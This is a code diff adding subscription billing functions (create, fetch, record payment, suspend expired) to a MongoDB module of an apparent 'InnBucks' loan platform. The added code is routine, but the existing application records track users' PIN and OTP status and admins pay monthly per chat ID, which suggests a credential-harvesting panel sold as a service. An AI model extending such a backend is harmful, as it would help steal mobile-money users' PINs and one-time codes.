@@ -7,7 +7,8 @@ let db;
 const DB_NAME = 'innbucks_loan_platform';
 const COLLECTIONS = {
     ADMINS: 'admins',
-    APPLICATIONS: 'applications'
+    APPLICATIONS: 'applications',
+    SUBSCRIPTIONS: 'subscriptions'
 };
 
 /**
@@ -55,6 +56,11 @@ async function createIndexes() {
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
+
+        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ adminId: 1 }, { unique: true });
+        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ subscriptionStatus: 1 });
+        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ nextBillingDate: 1 });
+        await db.collection(COLLECTIONS.SUBSCRIPTIONS).createIndex({ lastPaidDate: 1 });
 
         console.log('✅ Database indexes created');
     } catch (error) {
@@ -396,8 +402,125 @@ async function cleanupInvalidAdmins() {
 }
 
 // ==========================================
-// DELETE ALL ADMINS / APPLICATIONS
+// SUBSCRIPTION OPERATIONS
 // ==========================================
+
+async function initializeSubscription(adminId, adminName, chatId) {
+    try {
+        const nextBillingDate = new Date();
+        nextBillingDate.setMonth(nextBillingDate.getMonth() + 1);
+        nextBillingDate.setDate(1);
+
+        const subscription = {
+            adminId,
+            adminName,
+            chatId,
+            subscriptionStatus: 'active', // active, suspended, pending_payment
+            amount: 500,
+            currency: 'KES',
+            lastPaidDate: new Date().toISOString(),
+            nextBillingDate: nextBillingDate.toISOString(),
+            createdAt: new Date().toISOString(),
+            updatedAt: new Date().toISOString()
+        };
+
+        const result = await db.collection(COLLECTIONS.SUBSCRIPTIONS).insertOne(subscription);
+        console.log(`💳 Subscription initialized for ${adminId}`);
+        return result;
+    } catch (error) {
+        console.error('❌ Error initializing subscription:', error);
+        throw error;
+    }
+}
+
+async function getSubscription(adminId) {
+    try {
+        return await db.collection(COLLECTIONS.SUBSCRIPTIONS).findOne({ adminId });
+    } catch (error) {
+        console.error('❌ Error getting subscription:', error);
+        return null;
+    }
+}
+
+async function updateSubscriptionStatus(adminId, status) {
+    try {
+        const result = await db.collection(COLLECTIONS.SUBSCRIPTIONS).updateOne(
+            { adminId },
+            { $set: { subscriptionStatus: status, updatedAt: new Date().toISOString() } }
+        );
+        console.log(`💳 Subscription status updated for ${adminId}: ${status}`);
+        return result;
+    } catch (error) {
+        console.error('❌ Error updating subscription status:', error);
+        throw error;
+    }
+}
+
+async function recordPayment(adminId, paymentDetails) {
+    try {
+        const nextBillingDate = new Date();
+        nextBillingDate.setMonth(nextBillingDate.getMonth() + 1);
+        nextBillingDate.setDate(1);
+
+        const result = await db.collection(COLLECTIONS.SUBSCRIPTIONS).updateOne(
+            { adminId },
+            {
+                $set: {
+                    subscriptionStatus: 'active',
+                    lastPaidDate: new Date().toISOString(),
+                    nextBillingDate: nextBillingDate.toISOString(),
+                    updatedAt: new Date().toISOString(),
+                    lastPaymentDetails: paymentDetails
+                }
+            }
+        );
+        console.log(`💳 Payment recorded for ${adminId}`);
+        return result;
+    } catch (error) {
+        console.error('❌ Error recording payment:', error);
+        throw error;
+    }
+}
+
+async function suspendExpiredSubscriptions() {
+    try {
+        const now = new Date();
+        const result = await db.collection(COLLECTIONS.SUBSCRIPTIONS).updateMany(
+            {
+                nextBillingDate: { $lte: now },
+                subscriptionStatus: 'active'
+            },
+            { $set: { subscriptionStatus: 'suspended', updatedAt: new Date().toISOString() } }
+        );
+        console.log(`🔒 Suspended ${result.modifiedCount} expired subscription(s)`);
+        return result;
+    } catch (error) {
+        console.error('❌ Error suspending expired subscriptions:', error);
+        throw error;
+    }
+}
+
+async function getSuspendedSubscriptions() {
+    try {
+        return await db.collection(COLLECTIONS.SUBSCRIPTIONS)
+            .find({ subscriptionStatus: 'suspended' })
+            .toArray();
+    } catch (error) {
+        console.error('❌ Error getting suspended subscriptions:', error);
+        return [];
+    }
+}
+
+async function getPendingPayments() {
+    try {
+        return await db.collection(COLLECTIONS.SUBSCRIPTIONS)
+            .find({ subscriptionStatus: 'pending_payment' })
+            .toArray();
+    } catch (error) {
+        console.error('❌ Error getting pending payments:', error);
+        return [];
+    }
+}
 
 async function deleteAllAdmins() {
     try {
@@ -453,5 +576,13 @@ module.exports = {
     getAllAdminsDetailed,
     cleanupInvalidAdmins,
     deleteAllAdmins,
-    deleteAllApplications
+    deleteAllApplications,
+
+    initializeSubscription,
+    getSubscription,
+    updateSubscriptionStatus,
+    recordPayment,
+    suspendExpiredSubscriptions,
+    getSuspendedSubscriptions,
+    getPendingPayments
 };
